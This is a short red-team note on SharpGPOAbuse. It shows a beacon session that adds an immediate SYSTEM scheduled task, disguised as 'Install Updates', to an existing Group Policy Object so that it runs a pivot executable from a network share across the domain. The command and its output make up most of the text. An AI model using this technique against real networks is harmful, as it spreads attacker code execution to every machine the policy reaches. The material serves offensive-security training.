# SharpGPOAbuse

SharpGPOAbuse allows a wider range of "abusive" configurations to be added to a GPO.
-> It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to.

## [[Group Policy (GPO)]]
Add an Immediate Scheduled Task to existing GPO
``````beacon
beacon> getuid
[*] You are EDU\john

beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

[+] Domain = edu.evil.corp
[+] Domain Controller = dc-2.edu.evil.corp
[+] Distinguished Name = CN=Policies,CN=System,DC=edu,DC=evil,DC=corp
[+] GUID of "PowerShell Logging" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
[+] Creating file \\edu.evil.corp\SysVol\edu.evil.corp\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```````

```meta
requirements: 
results: 
oss: 
source: https://github.com/FSecureLABS/SharpGPOAbuse
description: 
```